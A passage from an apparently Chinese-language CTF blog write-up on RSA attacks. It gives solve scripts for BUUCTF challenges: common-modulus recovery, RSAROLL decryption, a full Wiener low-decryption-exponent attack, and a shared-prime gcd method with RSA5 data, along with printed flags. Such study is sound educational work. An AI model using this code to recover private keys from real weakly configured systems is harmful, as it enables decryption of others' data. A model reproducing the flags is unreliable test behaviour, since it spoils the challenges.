class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line"></span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line"></span><br><span class="line">flag=(<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>flag{49d91077a1abcb14f1a9d546c80be9ef}</p><p>也可以直接分解n求得，这里不再演示</p><h4 id="轴式rsa"><a href="#轴式rsa" class="headerlink" title="轴式rsa"></a>轴式rsa</h4><p>题目给出n和e以及一些数据，然后自己去找出p和q，再就是将这些数据的明文逐一解出，然后根据题目要求得到相应的形式</p><h4 id="buuctf-RSAROLL"><a href="#buuctf-RSAROLL" class="headerlink" title="buuctf RSAROLL"></a>buuctf RSAROLL</h4><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RSA roll！roll！roll！</span><br><span class="line">Only number and a-z</span><br><span class="line">（don&#x27;t use editor</span><br><span class="line">which MS provide）</span><br><span class="line">提示最终的明文是以数字和字母组成</span><br></pre></td></tr></table></figure><p>数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#123;920139713,19&#125;#给的n和e</span><br><span class="line">以下都是密文</span><br><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">18414022</span><br><span class="line">368270835</span><br><span class="line">483295235</span><br><span class="line">263072905</span><br><span class="line">459788476</span><br><span class="line">483295235</span><br><span class="line">459788476</span><br><span class="line">663551792</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">428313374</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">425392137</span><br><span class="line">704796792</span><br><span class="line">458265677</span><br><span class="line">341524652</span><br><span class="line">483295235</span><br><span class="line">534149509</span><br><span class="line">425392137</span><br><span class="line">428313374</span><br><span class="line">425392137</span><br><span class="line">341524652</span><br><span class="line">458265677</span><br><span class="line">263072905</span><br><span class="line">483295235</span><br><span class="line">828509797</span><br><span class="line">341524652</span><br><span class="line">425392137</span><br><span class="line">475206804</span><br><span class="line">428313374</span><br><span class="line">483295235</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">306220148</span><br></pre></td></tr></table></figure><p>编写脚本解题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line">e=<span class="number">19</span></span><br><span class="line">p=<span class="number">18443</span></span><br><span class="line">q=<span class="number">49891</span></span><br><span class="line">flag=[]</span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\\Rsaroll\\RsaRoll\\data.txt&quot;</span>,<span class="string">&quot;rb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> linedata <span class="keyword">in</span> f.readlines():</span><br><span class="line">        flag.append(<span class="built_in">pow</span>(<span class="built_in">int</span>(linedata),d,n))<span class="comment">#这里的linedata是字节c串类型的，由于pow函数不支持字节串类型，所以要将linedata转化为int类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>flag{13212je2ue28fy71w8u87y31r78eu1e2}</p><h3 id="低解密指数攻击"><a href="#低解密指数攻击" class="headerlink" title="低解密指数攻击"></a><a href="https://blog.csdn.net/weixin_44617902/article/details/113131016">低解密指数攻击</a></h3><p>当题目中n，e的位数大于120且题目只给出了e和n，那么就应该想到低解密指数攻击.</p><p>首先会用到攻击代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># numerator(n):分子, denominator(d)：分母</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t_cf</span>(<span class="params">n, d</span>):  <span class="comment"># 将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> d:</span><br><span class="line">        res.append(n // d)</span><br><span class="line">        n, d = d, n % d</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cf</span>(<span class="params">sub_res</span>):  <span class="comment"># 得到渐进分数的分母和分子</span></span><br><span class="line">    n, d = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:  <span class="comment"># 从后面往前循环</span></span><br><span class="line">        d, n = n, i * n + d</span><br><span class="line">    <span class="keyword">return</span> d, n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_fraction</span>(<span class="params">x, y</span>):  <span class="comment"># 列出每个渐进分数</span></span><br><span class="line">    res = t_cf(x, y)</span><br><span class="line">    res = <span class="built_in">list</span>(<span class="built_in">map</span>(cf, (res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(res)))))  <span class="comment"># 将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">a, b, c</span>):  <span class="comment"># 由p+q和pq的值通过维达定理来求解p和q(解二元一次方程)</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)  <span class="comment"># 由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1, x2 = (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line">    <span class="keyword">return</span> x1, x2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> list_fraction(e, n):  <span class="comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:  <span class="comment"># 可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:  <span class="comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k  <span class="comment"># 这个结果就是 φ(n)</span></span><br><span class="line"></span><br><span class="line">        px, qy = get_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> px * qy == n:</span><br><span class="line">            p, q = <span class="built_in">abs</span>(<span class="built_in">int</span>(px)), <span class="built_in">abs</span>(<span class="built_in">int</span>(qy))  <span class="comment"># 可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))  <span class="comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;求解d失败&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后直接破解</p><h4 id="buuctf-rsa2"><a href="#buuctf-rsa2" class="headerlink" title="buuctf rsa2"></a>buuctf rsa2</h4><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span><br><span class="line">e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span><br><span class="line"></span><br><span class="line">flag = &quot;flag&#123;&quot; + hashlib.md5(hex(d)).hexdigest() + &quot;&#125;&quot;</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>需要拿到d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> WienerAttack</span><br><span class="line"></span><br><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line">d=WienerAttack.wienerAttack(e,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(d))<span class="comment">#0x13b8f87d588e2aa4a27296cf2898f56ab4c8deb5a1222ec080e23afecaf7f975</span></span><br><span class="line">flag1 = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(d).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest() + <span class="string">&quot;&#125;&quot;</span><span class="comment">#hashlib中mod5的参数必须是一个bytes类型的数，所以将d用encode转化，这是在python3中，python2中不用转化，并且在python2中将d转化为16进制时会在末尾加上L，python3中不会，所以这里得到的flag1是出题人在python3环境下出题的结果，但这道题是出题人在python2环境下出的题，所以应该手动加上L即：</span></span><br><span class="line">flag2=<span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="string">b&#x27;0x13b8f87d588e2aa4a27296cf2898f56ab4c8deb5a1222ec080e23afecaf7f975&#x27;</span>).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag1,flag2)</span><br></pre></td></tr></table></figure><p>python3：flag{8159e6c4abdd3b94ce461ed9a1a24017}</p><p>python2：flag{47bf28da384590448e0b0d23909a25a4}</p><p>buuctf上需要的是python2</p><p>当然这道题用低解密指数攻击显得很麻烦，我们可以直接分解n，拿到p，q求出d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line">p=<span class="number">9046853915223503351787031888977627106934564043204783593118678181991596316582877057556463152579621699010610569526573031954779520781448550677767565207407183</span></span><br><span class="line">q=<span class="number">11273732364123571293429600400343309403733952146912318879993851141423284675797325272321856863528776914709992821287788339848962916204774010644058033316303937</span></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(d))</span><br><span class="line">flag1 = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(d).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">flag2=<span class="string">&quot;flag&#123;&quot;</span>+hashlib.md5(<span class="string">b&#x27;0x13b8f87d588e2aa4a27296cf2898f56ab4c8deb5a1222ec080e23afecaf7f975L&#x27;</span>).hexdigest()+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag1,<span class="string">&quot;\n&quot;</span>,flag2)</span><br></pre></td></tr></table></figure><h3 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a><a href="https://blog.csdn.net/m0_51507437/article/details/122745627">低加密指数广播攻击</a></h3><p>先了解一下<a href="https://www.cnblogs.com/freinds/p/6388992.html">中国剩余定理</a></p><h3 id="n不互素"><a href="#n不互素" class="headerlink" title="n不互素"></a>n不互素</h3><p>特点：</p><p>1.加密指数e非常小</p><p>2.一份明文使用不同的模数n，相同的加密指数e进行多次加密</p><p>可以拿到每一份加密后的密文和对应的模数n、加密指数e<br>解题思路：</p><p>1.由于模数n只能分解为p和q，所以当n很多时，p或q有相同的风险</p><p>因此不同的模数n中可能存在相同的p或者说q</p><p>2.求出不同n之间的最大公约数 gcd()，如果大于1说明这里存在漏洞，可以继续攻击</p><p>所得到的最大公约数就是p或q，然后可得d</p><p>有私钥d就能得到明文</p><h4 id="buuctf-RSA5"><a href="#buuctf-RSA5" class="headerlink" title="buuctf RSA5"></a>buuctf RSA5</h4><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">m = xxxxxxxx</span><br><span class="line">e = 65537</span><br><span class="line">========== n c ==========</span><br><span class="line">n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span><br><span class="line">c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span><br><span class="line"></span><br><span class="line">n = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span><br><span class="line">c = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span><br><span class="line"></span><br><span class="line">n = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span><br><span class="line">c = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span><br><span class="line"></span><br><span class="line">n = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span><br><span class="line">c = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span><br><span class="line"></span><br><span class="line">n = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span><br><span class="line">c = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span><br><span class="line"></span><br><span class="line">n = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span><br><span class="line">c = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span><br><span class="line"></span><br><span class="line">n = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span><br><span class="line">c = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span><br><span class="line"></span><br><span class="line">n = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span><br><span class="line">c = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span><br><span class="line"></span><br><span class="line">n = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span><br><span class="line">c = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span><br><span class="line"></span><br><span class="line">n = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span><br><span class="line">c = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span><br><span class="line"></span><br><span class="line">n = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span><br><span class="line">c = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span><br><span class="line"></span><br><span class="line">n = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span><br><span class="line">c = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span><br><span class="line"></span><br><span class="line">n = 